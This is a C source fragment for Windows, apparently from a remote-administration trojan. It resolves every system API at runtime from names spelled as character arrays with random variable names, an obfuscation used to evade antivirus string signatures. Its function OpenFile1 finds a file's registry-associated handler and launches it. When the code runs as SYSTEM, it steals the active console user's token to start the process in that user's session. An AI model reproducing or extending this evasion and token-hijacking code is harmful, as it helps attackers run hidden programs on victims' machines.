typedef LONG
(APIENTRY
 *RegOpenKeyExAT)(
 __in HKEY hKey,
 __in_opt LPCSTR lpSubKey,
 __reserved DWORD ulOptions,
 __in REGSAM samDesired,
 __out PHKEY phkResult
 );
typedef LONG
(APIENTRY
 *RegQueryValueAT)(
 __in HKEY hKey,
 __in_opt LPCSTR lpSubKey,
 __out_bcount_opt(*lpcbData) LPSTR lpData,
 __inout_opt PLONG lpcbData
 );
typedef LONG
(APIENTRY
 *RegCloseKeyT)(
 __in HKEY hKey
 );
typedef BOOL
(WINAPI
 *CreateProcessAT)(
 __in_opt    LPCSTR lpApplicationName,
 __inout_opt LPSTR lpCommandLine,
 __in_opt    LPSECURITY_ATTRIBUTES lpProcessAttributes,
 __in_opt    LPSECURITY_ATTRIBUTES lpThreadAttributes,
 __in        BOOL bInheritHandles,
 __in        DWORD dwCreationFlags,
 __in_opt    LPVOID lpEnvironment,
 __in_opt    LPCSTR lpCurrentDirectory,
 __in        LPSTARTUPINFOA lpStartupInfo,
 __out       LPPROCESS_INFORMATION lpProcessInformation
    );

typedef BOOL
(WINAPI
 *CreateProcessAsUserAT)(
 __in_opt    HANDLE hToken,
 __in_opt    LPCSTR lpApplicationName,
 __inout_opt LPSTR lpCommandLine,
 __in_opt    LPSECURITY_ATTRIBUTES lpProcessAttributes,
 __in_opt    LPSECURITY_ATTRIBUTES lpThreadAttributes,
 __in        BOOL bInheritHandles,
 __in        DWORD dwCreationFlags,
 __in_opt    LPVOID lpEnvironment,
 __in_opt    LPCSTR lpCurrentDirectory,
 __in        LPSTARTUPINFOA lpStartupInfo,
 __out       LPPROCESS_INFORMATION lpProcessInformation
 ); 
LPSTR		lpszUserSid = NULL;	
FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName)
{
	HMODULE hModule;
	hModule = GetModuleHandleA(lpFileName);
	if (hModule == NULL)
		hModule = LoadLibraryA(lpFileName);
	if (hModule != NULL)
		return GetProcAddress(hModule,lpProcName);
	else
		return NULL;
}
bool OpenFile1(LPCTSTR lpFile, BOOL bRunInAcsiUser, INT nShowCmd)
{
	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char r6oRe[]={'G','e','t','F','i','l','e','A','t','t','r','i','b','u','t','e','s','A','\0'};
	GetFileAttributesAT pGetFileAttributesA = (GetFileAttributesAT)MyGetProcAddressA(iOagR,r6oRe);
	
	char xWiSd[]={'S','H','E','L','L','3','2','.','d','l','l','\0'};
	char zIksG[]={'S','h','e','l','l','E','x','e','c','u','t','e','A','\0'};
	ShellExecuteAT pShellExecuteA=(ShellExecuteAT)MyGetProcAddressA(xWiSd,zIksG);
	
	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	char KoX3m[]={'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
	RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)MyGetProcAddressA(AjrFx,KoX3m);
	
	char jIomR[]={'R','e','g','Q','u','e','r','y','V','a','l','u','e','A','\0'};
	RegQueryValueAT pRegQueryValueA=(RegQueryValueAT)MyGetProcAddressA(AjrFx,jIomR);
	
	char fZkmT[]={'R','e','g','C','l','o','s','e','K','e','y','\0'};
	RegCloseKeyT pRegCloseKey=(RegCloseKeyT)MyGetProcAddressA(AjrFx,fZkmT);
	
	char wSuTs[]={'W','T','S','G','e','t','A','c','t','i','v','e','C','o','n','s','o','l','e','S','e','s','s','i','o','n','I','d','\0'};
	typedef DWORD (WINAPI *WTSGetActiveConsoleSessionIdT)(void);
	WTSGetActiveConsoleSessionIdT pWTSGetActiveConsoleSessionId=(WTSGetActiveConsoleSessionIdT)MyGetProcAddressA(iOagR,wSuTs);
	
	char oIksN[]={'W','T','S','A','P','I','3','2','.','d','l','l','\0'};
	char xAsDm[]={'W','T','S','Q','u','e','r','y','U','s','e','r','T','o','k','e','n','\0'};
	typedef BOOL (WINAPI *WTSQueryUserTokenT)(ULONG SessionId,PHANDLE phToken);
	WTSQueryUserTokenT pWTSQueryUserToken=(WTSQueryUserTokenT)MyGetProcAddressA(oIksN,xAsDm);
	
	char kTLdR[]={'C','r','e','a','t','e','P','r','o','c','e','s','s','A','\0'};
	CreateProcessAT pCreateProcessA=(CreateProcessAT)MyGetProcAddressA(iOagR,kTLdR);
	
	char rAtzT[]={'C','r','e','a','t','e','P','r','o','c','e','s','s','A','s','U','s','e','r','A','\0'};
	CreateProcessAsUserAT pCreateProcessAsUserA=(CreateProcessAsUserAT)MyGetProcAddressA(AjrFx,rAtzT);
	
	char	lpSubKey[512];
	HKEY	hKey;
	char	strTemp[1024];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	DWORD dwFileAttr = pGetFileAttributesA(lpFile);
	if (dwFileAttr == INVALID_FILE_ATTRIBUTES)
		return false;
	if (dwFileAttr & FILE_ATTRIBUTE_DIRECTORY)
		return pShellExecuteA(NULL, "open", lpFile, NULL, NULL, SW_SHOW) > (HINSTANCE)32;
	
	char	*lpExt = strrchr(lpFile, '.');
	if (lpExt == NULL)
		return false;
	
	char	szCurrentDirectory[MAX_PATH];
	memset(szCurrentDirectory, 0, sizeof(szCurrentDirectory));
	strncpy(szCurrentDirectory, lpFile, strrchr(lpFile, '\\') - lpFile);
	
	char szUserName[UNLEN+1];
	DWORD dwUserLen = UNLEN;
	GetUserName(szUserName, &dwUserLen);
	if (stricmp(szUserName, "SYSTEM") == 0)
	{
		while (lpszUserSid == NULL)
			Sleep(100);
	}
	
	if (lpszUserSid != NULL)
	{
		memset(lpSubKey, 0, sizeof(lpSubKey));
		sprintf(lpSubKey, "%s_Classes\\%s", lpszUserSid, lpExt);
		if (pRegOpenKeyExA(HKEY_USERS, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		{
			if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
				return false;
		}
	}
	else if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
	{
		return false;
	}
	pRegQueryValueA(hKey, NULL, strTemp, &nSize);
	pRegCloseKey(hKey);
	
	if (lpszUserSid != NULL)
	{
		memset(lpSubKey, 0, sizeof(lpSubKey));
		sprintf(lpSubKey, "%s_Classes\\%s\\shell\\open\\command", lpszUserSid, strTemp);
		if (pRegOpenKeyExA(HKEY_USERS, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		{
			memset(lpSubKey, 0, sizeof(lpSubKey));
			sprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
			if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
				return false;
		}
	}
	else
	{
		memset(lpSubKey, 0, sizeof(lpSubKey));
		sprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
		if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
			return false;
	}
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	pRegQueryValueA(hKey, NULL, strTemp, &nSize);
	pRegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = nShowCmd;
	BOOL	bFileExtMatch = stricmp(lpExt, ".exe") && stricmp(lpExt, ".bat") && stricmp(lpExt, ".com");
	DWORD	dwSessionId = 0;
	HANDLE	hTokenAcsi = NULL;
	
	if (stricmp(szUserName, "SYSTEM") == 0 && (bRunInAcsiUser ? TRUE : bFileExtMatch))
	{
		dwSessionId = pWTSGetActiveConsoleSessionId();
		if (dwSessionId == 0xFFFFFFFF)
			return false;
		if (!pWTSQueryUserToken(dwSessionId, &hTokenAcsi))
			return false;
	}
	
	if (hTokenAcsi == NULL) // 可执行文件(.exe .bat .com), 以SYSTEM权限运行
	{
		if (!pCreateProcessA(NULL, strTemp, NULL, NULL, FALSE, 0, NULL, szCurrentDirectory, &si, &pi))
			return false;
	}
	else if (!pCreateProcessAsUserA(hTokenAcsi, NULL, strTemp, NULL, NULL, FALSE, 0, NULL, szCurrentDirectory, &si, &pi))
	{
		CloseHandle(hTokenAcsi);
		return false;
	}
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	if (hTokenAcsi)
		CloseHandle(hTokenAcsi);
	return true;
}